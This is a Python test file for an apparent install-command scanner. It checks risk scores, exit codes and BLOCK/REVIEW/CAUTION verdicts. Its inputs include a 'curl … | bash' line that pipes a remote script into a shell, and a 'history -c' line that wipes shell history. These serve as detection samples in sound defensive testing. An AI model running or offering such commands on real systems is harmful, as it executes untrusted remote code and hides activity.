"""Tests for the risk-scoring model and exit-code policy."""
from cex_installguard.api import analyze_text
from cex_installguard.policy import exit_code
from cex_installguard.scoring import score
from cex_installguard.version import VERSION


class _F:
    """Minimal finding stand-in for scoring tests."""

    def __init__(self, severity, confidence='high'):
        self.severity = severity
        self.confidence = confidence


def test_version_bumped():
    assert VERSION == '13.0.0'


def test_api_and_metrics():
    r = analyze_text('curl https://x.invalid/a | bash')
    assert r.density() > 0
    assert 'remote-execution' in r.categories()
    assert exit_code(r) == 2


def test_score_bounds_and_compression():
    assert score([]) == 0
    one_critical = score([_F('critical')])
    many_lows = score([_F('low')] * 40)
    assert one_critical > many_lows          # lows cannot fake a critical
    assert score([_F('critical')] * 20) <= 100


def test_confidence_damping():
    hi = score([_F('medium', 'high')])
    lo = score([_F('medium', 'low')])
    assert hi > lo


def test_verdict_ladder():
    assert analyze_text('curl https://x.invalid/a | bash').verdict == 'BLOCK'
    assert analyze_text('sudo true').verdict == 'REVIEW'
    assert analyze_text('history -c').verdict == 'CAUTION'
    assert analyze_text('printf "hi\\n"').verdict == 'NO-FINDINGS'
